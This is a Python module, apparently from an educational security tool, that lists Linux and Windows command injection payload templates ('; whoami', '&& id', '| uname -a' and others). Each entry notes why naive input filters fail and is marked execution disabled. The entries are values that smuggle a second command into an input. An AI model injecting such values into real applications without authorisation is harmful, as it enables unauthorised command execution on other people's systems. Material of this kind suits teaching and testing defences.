# modules/command_injection.py

def generate_cmd(os_type=None):
    """
    Generate educational Command Injection payload templates.
    Supports:
    - OS types: linux, windows
    - Command separators as strings only
    - Explanation of why filters fail
    - Execution disabled by default
    """

    payloads = []

    # LINUX PAYLOADS

    payloads.append({
        "id": "CMD-LINUX-001",
        "os": "linux",
        "payload": "; whoami",
        "description": "Linux command chaining using semicolon",
        "bypass_techniques": ["command separator injection"],
        "why_filters_fail": "Naive filters may block only specific keywords but not command separators like ';'",
        "execution_disabled": True
    })

    payloads.append({
        "id": "CMD-LINUX-002",
        "os": "linux",
        "payload": "&& id",
        "description": "Linux logical AND command chaining",
        "bypass_techniques": ["logical operator abuse"],
        "why_filters_fail": "Applications often fail to sanitize logical operators like '&&'",
        "execution_disabled": True
    })

    payloads.append({
        "id": "CMD-LINUX-003",
        "os": "linux",
        "payload": "| uname -a",
        "description": "Linux pipe operator injection",
        "bypass_techniques": ["pipe operator abuse"],
        "why_filters_fail": "Filters may not account for alternate execution methods such as pipes",
        "execution_disabled": True
    })

    # WINDOWS PAYLOADS

    payloads.append({
        "id": "CMD-WIN-001",
        "os": "windows",
        "payload": "& whoami",
        "description": "Windows command chaining using ampersand",
        "bypass_techniques": ["command separator injection"],
        "why_filters_fail": "Windows command chaining operators are often overlooked in validation",
        "execution_disabled": True
    })

    payloads.append({
        "id": "CMD-WIN-002",
        "os": "windows",
        "payload": "|| dir",
        "description": "Windows logical OR command chaining",
        "bypass_techniques": ["logical operator abuse"],
        "why_filters_fail": "Naive filters may not properly handle '||' operators",
        "execution_disabled": True
    })

    # Filtering Logic

    if os_type:
        payloads = [p for p in payloads if p["os"] == os_type]

    return payloads
